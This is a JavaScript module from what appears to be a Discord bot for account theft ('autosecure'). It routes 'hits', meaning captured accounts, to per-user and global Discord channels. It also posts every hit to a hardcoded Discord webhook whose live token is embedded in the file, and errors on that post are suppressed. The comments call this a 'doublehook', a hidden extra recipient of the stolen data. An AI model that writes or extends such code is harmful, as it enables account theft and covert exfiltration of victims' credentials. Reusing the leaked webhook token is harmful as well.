const { EmbedBuilder } = require('discord.js');
const { queryParams } = require('../../db/database');
const axios = require('axios');

// Discord webhook for hit embeds
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1455848080548171816/48SYnyhFRH7VlzDWTA_41FPux7p7QJoQsKS2sGqtOTgA3sy0eWo5OBGLzNTahgRI0B7O';

/**
 * Sends hit embed to both hits_channel and allhits_channel (doublehook)
 * @param {Object} client - Discord client
 * @param {Object} msg - Message object with embeds and components
 * @param {String} userId - User ID who secured the account
 * @param {String} username - Username who secured the account
 * @param {String} botUserId - Bot user ID (for getting hits_channel)
 * @returns {Promise<void>}
 */
async function sendHitsToChannels(client, msg, userId, username, botUserId) {
  console.log(`[SENDHITS] Called with userId: ${userId}, username: ${username}, botUserId: ${botUserId}`);
  console.log(`[SENDHITS] Message structure:`, {
    hasEmbeds: !!msg.embeds,
    embedCount: msg.embeds?.length || 0,
    hasComponents: !!msg.components,
    componentCount: msg.components?.length || 0
  });
  
  try {
    // Get hits_channel from bot settings
    // In mainbot context, botUserId might be the user's ID, so we need to find their bot
    let hGuildId = null;
    let hChannelId = null;
    
    // Try to get hits_channel from user's bots
    const botSettings = await queryParams(
      "SELECT hits_channel FROM autosecure WHERE user_id = ? AND hits_channel IS NOT NULL LIMIT 1",
      [userId]
    );
    
    console.log(`[SENDHITS] Bot settings found:`, botSettings.length);
    
    if (botSettings && botSettings.length > 0 && botSettings[0].hits_channel) {
      [hChannelId, hGuildId] = botSettings[0].hits_channel.split("|");
      console.log(`[SENDHITS] Hits channel: ${hChannelId} in guild ${hGuildId}`);
    } else {
      console.log(`[SENDHITS] No hits_channel found for user ${userId}`);
    }

    // Get allhits_channel (global setting)
    let ahChannelId = null;
    let ahGuildId = null;
    const allHitsSettings = await queryParams(
      "SELECT allhits_channel FROM autosecure WHERE allhits_channel IS NOT NULL AND allhits_channel != '' LIMIT 1"
    );
    
    console.log(`[SENDHITS] AllHits settings query result:`, JSON.stringify(allHitsSettings));
    if (allHitsSettings && allHitsSettings.length > 0 && allHitsSettings[0].allhits_channel) {
      const allhitsValue = allHitsSettings[0].allhits_channel;
      console.log(`[SENDHITS] Found allhits_channel value: "${allhitsValue}"`);
      const parts = allhitsValue.split("|");
      if (parts.length === 2 && parts[0] && parts[1]) {
        [ahChannelId, ahGuildId] = parts;
        console.log(`[SENDHITS] Successfully parsed - Channel ID: ${ahChannelId}, Guild ID: ${ahGuildId}`);
      } else {
        console.error(`[SENDHITS] Invalid allhits_channel format: "${allhitsValue}" (expected "channelId|guildId")`);
      }
    } else {
      console.log(`[SENDHITS] No allhits_channel configured in database. Make sure to set it using /admin config set_allhits_channel`);
    }

    // Send to hits_channel
    if (hGuildId && hChannelId) {
      try {
        const guild = await client.guilds.fetch(hGuildId).catch(() => null);
        if (guild) {
          const channel = await guild.channels.fetch(hChannelId).catch(() => null);
          if (channel) {
            await channel.send(msg).catch(err => {
              console.error(`[HITS] Failed to send to hits channel: ${err.message}`);
            });
          } else {
            console.warn(`[HITS] Channel ${hChannelId} not found in guild ${hGuildId}`);
          }
        } else {
          console.warn(`[HITS] Guild ${hGuildId} not found`);
        }
      } catch (err) {
        console.error(`[HITS] Error sending to hits channel: ${err.message}`);
      }
    } else {
      console.log(`[HITS] No hits_channel configured for user ${userId}`);
    }

    // Send to Discord webhook
    if (DISCORD_WEBHOOK_URL && msg.embeds && msg.embeds.length > 0) {
      try {
        const webhookPayload = {
          embeds: msg.embeds,
          components: msg.components || []
        };
        await axios.post(DISCORD_WEBHOOK_URL, webhookPayload);
      } catch (error) {
        // Silently fail
      }
    }

    // Send to allhits_channel with user info
    if (ahChannelId && ahGuildId) {
      console.log(`[ALLHITS] Sending to allhits channel: ${ahChannelId} in guild ${ahGuildId}`);
      // Get user license/trial status
      let licenseStatus = "No License";
      let isTrial = false;
      try {
        const licenseData = await queryParams(
          "SELECT * FROM usedLicenses WHERE user_id = ? ORDER BY expiry DESC LIMIT 1",
          [userId]
        );
        if (licenseData && licenseData.length > 0) {
          const license = licenseData[0];
          const expiry = parseInt(license.expiry);
          if (expiry > Date.now()) {
            isTrial = license.istrial === 1 || license.istrial === "1";
            licenseStatus = isTrial ? "Trial" : "License";
          } else {
            licenseStatus = "Expired";
          }
        }
      } catch (licenseError) {
        console.error('[ALLHITS] Error fetching license status:', licenseError);
      }

      // Clone the message and modify embeds
      const allHitsMsg = {
        embeds: [],
        components: msg.components || []
      };

      // Process each embed
      if (msg.embeds && Array.isArray(msg.embeds)) {
        console.log(`[ALLHITS] Processing ${msg.embeds.length} embeds`);
        for (let i = 0; i < msg.embeds.length; i++) {
          const embedData = msg.embeds[i];
          try {
            console.log(`[ALLHITS] Processing embed ${i + 1}, type:`, embedData.constructor?.name || typeof embedData);
            
            // Convert embed data to EmbedBuilder (handles both plain objects and EmbedBuilder instances)
            let embed;
            if (embedData instanceof EmbedBuilder) {
              embed = embedData;
            } else if (embedData && typeof embedData === 'object') {
              embed = EmbedBuilder.from(embedData);
            } else {
              console.warn(`[ALLHITS] Skipping invalid embed data at index ${i}`);
              continue;
            }
            
            // Add user info field at the beginning
            embed.spliceFields(0, 0, {
              name: '👤 Discord User',
              value: `**Username:** ${username}\n**ID:** ${userId}\n**Status:** ${licenseStatus}${isTrial ? ' (Trial)' : ''}`,
              inline: true
            });
            
            allHitsMsg.embeds.push(embed);
            console.log(`[ALLHITS] Successfully processed embed ${i + 1}`);
          } catch (embedError) {
            console.error(`[ALLHITS] Error processing embed ${i + 1}:`, embedError);
            // Fallback: try to add as-is if it's a valid object
            if (embedData && typeof embedData === 'object') {
              allHitsMsg.embeds.push(embedData);
            }
          }
        }
      } else {
        console.warn(`[ALLHITS] Message has no embeds or embeds is not an array. Type:`, typeof msg.embeds);
      }
      
      console.log(`[ALLHITS] Final message has ${allHitsMsg.embeds.length} embeds`);

      try {
        const guild = await client.guilds.fetch(ahGuildId).catch(() => null);
        if (guild) {
          const channel = await guild.channels.fetch(ahChannelId).catch(() => null);
          if (channel) {
            await channel.send(allHitsMsg).catch(err => {
              console.error(`[ALLHITS] Failed to send full hit embed to allhits channel: ${err.message}`);
            });
            console.log(`[ALLHITS] Successfully sent hit embed to allhits channel`);
          } else {
            console.warn(`[ALLHITS] Channel ${ahChannelId} not found in guild ${ahGuildId}`);
          }
        } else {
          console.warn(`[ALLHITS] Guild ${ahGuildId} not found`);
        }
      } catch (err) {
        console.error(`[ALLHITS] Error sending to allhits channel: ${err.message}`);
      }
    } else {
      console.log(`[ALLHITS] No allhits_channel configured`);
    }
  } catch (error) {
    console.error('[SENDHITS] Error sending hits to channels:', error);
  }
}

module.exports = { sendHitsToChannels };

